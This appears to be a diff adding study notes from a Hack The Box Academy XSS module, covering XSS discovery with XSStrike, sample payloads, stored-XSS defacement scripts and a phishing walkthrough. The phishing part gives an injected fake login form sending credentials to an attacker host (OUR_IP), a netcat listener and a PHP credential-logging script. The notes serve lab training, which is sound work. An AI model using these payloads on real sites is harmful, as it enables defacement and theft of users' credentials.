@@ -243,3 +243,320 @@ http://SERVER_IP:PORT/#task=<img src=
 
 ### Targeting Users
 To target a user with this DOM XSS vulnerability, copy the URL from the browser and share it with them. Once they visit it, the JavaScript code will execute. Depending on the web application and browser's security, different payloads might be required, which we will discuss further in the next section.
+
+---
+
+# XSS Discovery
+
+By now, we should have a good understanding of what an XSS vulnerability is, the three types of XSS, and how each type differs from the others. We should also understand how XSS works through injecting JavaScript code into the client-side page source, thus executing additional code, which we will later learn how to utilize to our advantage.
+
+In this section, we will go through various ways of detecting XSS vulnerabilities within a web application. Detecting vulnerabilities can be as challenging as exploiting them. However, as XSS vulnerabilities are widespread, many tools can help us detect and identify them.
+
+## Automated Discovery
+
+Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP) have various capabilities for detecting all three types of XSS vulnerabilities. These scanners usually perform two types of scans:
+
+1. **Passive Scan**: Reviews client-side code for potential DOM-based vulnerabilities.
+2. **Active Scan**: Sends various types of payloads to attempt to trigger an XSS through payload injection in the page source.
+
+While paid tools often have higher accuracy in detecting XSS vulnerabilities (especially when security bypasses are required), open-source tools can also assist in identifying potential XSS vulnerabilities. These tools work by:
+
+1. Identifying input fields in web pages.
+2. Sending various types of XSS payloads.
+3. Comparing the rendered page source to check if the payload is reflected, which may indicate successful XSS injection.
+
+Some common open-source tools include:
+
+- **XSS Strike**
+- **Brute XSS**
+- **XSSer**
+
+### Using XSS Strike
+
+```bash
+# Clone the repository
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip install -r requirements.txt
+
+# Run XSStrike\python xsstrike.py
+```
+
+#### Example:
+
+```bash
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
+```
+
+**Output:**
+
+```
+XSStrike v3.1.4
+
+[~] Checking for DOM vulnerabilities 
+[+] WAF Status: Offline 
+[!] Testing parameter: task 
+[!] Reflections found: 1 
+[~] Analysing reflections 
+[~] Generating payloads 
+[!] Payloads generated: 3072 
+------------------------------------------------------------
+[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
+[!] Efficiency: 100 
+[!] Confidence: 10 
+[?] Would you like to continue scanning? [y/N]
+```
+
+The tool identified the parameter as vulnerable to XSS. Try verifying the payload by testing it in previous exercises. Experiment with other tools and observe their effectiveness in detecting XSS vulnerabilities.
+
+## Manual Discovery
+
+The difficulty of manual XSS discovery depends on the security level of the web application. Basic vulnerabilities can often be found by testing common XSS payloads, but advanced vulnerabilities require in-depth code review skills.
+
+### XSS Payloads
+
+The simplest method for finding XSS vulnerabilities is manually testing various payloads against an input field in a web page. You can find extensive payload lists online, such as:
+
+- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [PayloadBox](https://github.com/payloadbox)
+
+Examples:
+
+```html
+<script>alert(1)</script>
+<img src="" onerror=alert(1)>
+<style>body{background:expression(alert(1))}</style>
+```
+
+These payloads can be tested in HTML input fields or HTTP headers (e.g., Cookie, User-Agent). However, most will fail as they are designed for specific scenarios or to bypass security measures. Writing custom scripts to automate testing can save time and effort.
+
+### Code Review
+
+The most reliable way to detect XSS vulnerabilities is manual code review, covering both back-end and front-end code. By understanding how input is handled until it reaches the browser, you can write precise payloads with high confidence.
+
+#### Example:
+
+In the previous section, we reviewed HTML code for DOM-based XSS, identifying the Source and Sink. Front-end code review is essential for finding vulnerabilities that automated tools might miss. While advanced techniques are out of scope for this module, resources like **Secure Coding 101: JavaScript** and **Whitebox Pentesting 101: Command Injection** cover them extensively.
+
+---
+
+In summary, combining automated tools, manual testing, and code review provides the best approach to discovering XSS vulnerabilities effectively.
+
+#Ejercicio
+  ##Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?
+    ```python xsstrike.py -u "http://94.237.50.41:33731/?fullname=ads&username=adas&password=ads&email=adsds%40gmail.com"```
+
+---
+
+# Defacing
+
+Now that we understand the different types of XSS and various methods of discovering XSS vulnerabilities in web pages, we can start learning how to exploit these XSS vulnerabilities. As previously mentioned, the damage and the scope of an XSS attack depend on the type of XSS, with stored XSS being the most critical and DOM-based being less so.
+
+One of the most common attacks using stored XSS vulnerabilities is website defacing. Defacing a website means changing its appearance for anyone who visits it. Hacker groups often use defacing to claim that they successfully hacked a site. For instance, hackers defaced the UK National Health Service (NHS) website in 2018. Such attacks can carry significant media attention and impact a company's reputation, investments, and share prices, especially for banks and technology firms.
+
+## Defacement Elements
+
+Injected JavaScript code (via XSS) can modify a web page's appearance. Defacing typically involves sending a simple message, such as "we hacked you," rather than creating a visually appealing page. Commonly used HTML elements for defacing include:
+
+- **Background Color:** `document.body.style.background`
+- **Background Image:** `document.body.background`
+- **Page Title:** `document.title`
+- **Page Text:** `DOM.innerHTML`
+
+### Changing Background
+
+To change a web page's background color, use the following payload:
+
+```html
+<script>document.body.style.background = "#141d2b"</script>
+```
+
+This sets the background to a dark color (e.g., Hack The Box's default background). For an image background, use:
+
+```html
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+```
+
+### Changing Page Title
+
+Modify the page title using:
+
+```html
+<script>document.title = 'HackTheBox Academy'</script>
+```
+
+The browser tab/window will display the new title.
+
+### Changing Page Text
+
+To change text on the page, use the `innerHTML` property:
+
+```javascript
+document.getElementById("todo").innerHTML = "New Text";
+```
+
+For broader changes, replace the entire page's content:
+
+```javascript
+document.getElementsByTagName('body')[0].innerHTML = "New Text";
+```
+
+Example using Hack The Box Academy's HTML structure:
+
+```html
+<script>
+document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"></p></center>';
+</script>
+```
+
+### Final Payload
+
+Combine the changes to create a defaced web page:
+
+```html
+<script>
+document.body.style.background = "#141d2b";
+document.title = 'HackTheBox Academy';
+document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"></p></center>';
+</script>
+```
+
+Once injected into a vulnerable To-Do list, this payload will persist across page refreshes, defacing the web page for all visitors.
+
+### Observing Source Code
+
+Even after defacement, the original source code remains intact, with the injected payload appearing at the end:
+
+```html
+<div></div><ul class="list-unstyled" id="todo"><ul>
+<script>document.body.style.background = "#141d2b"</script>
+</ul><ul><script>document.title = 'HackTheBox Academy'</script>
+</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
+</ul></ul>
+```
+
+The injected JavaScript executes when the page loads, changing its appearance. However, if the injection occurs in the middle of the source code, additional elements/scripts may follow, requiring adjustments to achieve the desired look.
+
+To ordinary users, the defaced page will display the intended changes, obscuring the original content.
+
+---
+
+# Phishing
+
+Phishing attacks commonly exploit XSS vulnerabilities to inject fake login forms, tricking victims into submitting sensitive information to an attacker's server. These credentials can then be used to gain unauthorized access to accounts and sensitive data. Phishing via XSS can also be used as a simulation exercise to evaluate an organization's security awareness.
+
+## XSS Discovery
+
+We begin by identifying an XSS vulnerability in the web application. For example, consider the following URL for an image viewer:
+
+```
+http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg
+```
+
+We control the `url` parameter, allowing us to test XSS payloads. If a basic payload fails, analyze the HTML source to find a working payload. Once a suitable payload is identified, we can proceed with the phishing attack.
+
+## Login Form Injection
+
+To perform a phishing attack, inject an HTML login form that sends submitted credentials to a server we control. Example login form:
+
+```html
+<h3>Please login to continue</h3>
+<form action="http://OUR_IP">
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+```
+
+Replace `OUR_IP` with your server's IP address. Minify and embed this form into a JavaScript `document.write()` function:
+
+```javascript
+document.write('<h3>Please login to continue</h3><form action="http://OUR_IP"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+
+Inject this JavaScript code using the discovered XSS vulnerability. For example:
+
+```
+http://SERVER_IP/phishing/index.php?url=...PAYLOAD...
+```
+
+### Removing Original Elements
+
+To make the page more convincing, remove the original `url` field using JavaScript:
+
+```javascript
+document.getElementById('urlform').remove();
+```
+
+Add this to your payload after the `document.write` function:
+
+```javascript
+document.write('<h3>Please login to continue</h3><form action="http://OUR_IP"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
+```
+
+Comment out remaining HTML using an opening comment tag (`<!--`) after your payload:
+
+```html
+...PAYLOAD... <!-- 
+```
+
+This ensures the injected login form appears alone, giving the impression that logging in is required.
+
+## Credential Stealing
+
+Start a netcat listener to capture credentials:
+
+```bash
+sudo nc -lvnp 80
+```
+
+When a victim submits the form, you will capture their credentials in the request:
+
+```
+GET /?username=test&password=test&submit=Login HTTP/1.1
+```
+
+To avoid raising suspicion, use a PHP script to log credentials and redirect victims back to the original page:
+
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+
+Save this script as `index.php` and host it using PHP's built-in server:
+
+```bash
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+sudo php -S 0.0.0.0:80
+```
+
+## Testing the Attack
+
+Visit the injected URL, submit test credentials, and check the `creds.txt` file for captured data:
+
+```bash
+cat creds.txt
+```
+
+### Example Output:
+
+```
+Username: test | Password: test
+```
+
+With the PHP server running, share the URL containing the XSS payload with victims. When they log in, their credentials are captured without raising suspicion.
+
+#Ejercicio
+  ##Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.
+
+  
+---
+
